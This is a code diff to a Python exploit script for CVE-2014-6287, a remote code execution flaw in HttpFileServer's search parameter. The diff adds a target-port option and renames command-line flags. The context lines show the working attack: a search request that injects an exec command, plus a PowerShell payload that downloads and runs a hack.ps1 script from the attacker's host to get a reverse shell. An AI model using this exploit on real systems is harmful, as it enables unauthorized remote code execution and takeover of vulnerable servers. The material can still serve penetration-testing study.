@@ -9,9 +9,9 @@ requests.packages.urllib3.disable_warnings()
 class CVE2014_6287_RCE:
     headers = {"User-Agent" : "Mozilla/5.0"}
 
-    def __init__(self, rhost, lhost, lport):
+    def __init__(self, rhost, rport, lhost, lport):
         print (LogColors.BLUE + "victim: " + rhost  + "..." + LogColors.ENDC)
-        self.rhost = rhost
+        self.rhost, self.rport = rhost, rport
         self.lhost, self.lport = lhost, lport
         self.session = requests.Session()
 
@@ -45,7 +45,7 @@ class CVE2014_6287_RCE:
         payload += 'DownloadString(\'http://{}:8000/hack.ps1\');"'.format(self.lhost)
         payload = requests.utils.requote_uri(payload)
         try:
-            r = self.session.get("http://" + self.rhost + "/?search=%00{.+exec|" + payload + ".}")
+            r = self.session.get("http://" + self.rhost + ":" + self.rport + "/?search=%00{.+exec|" + payload + ".}")
         except Exception as e:
             print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
             sys.exit()
@@ -60,11 +60,12 @@ class CVE2014_6287_RCE:
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-r','--rhost', required = True, help = "target host")
-    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
-    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
+    parser.add_argument('-p','--rport', required = True, help = "target port")
+    parser.add_argument('-I','--ip', required = True, help = "revshell listener ip")
+    parser.add_argument('-P','--port', required = True, help = "revshell listener port")
     args = vars(parser.parse_args())
-    rhost = args['rhost']
+    rhost, rport = args['rhost'], args['rport']
     ip, port = args['ip'], args['port']
-    cve = CVE2014_6287_RCE(rhost, ip, port)
+    cve = CVE2014_6287_RCE(rhost, rport, ip, port)
     cve.exploit()
 
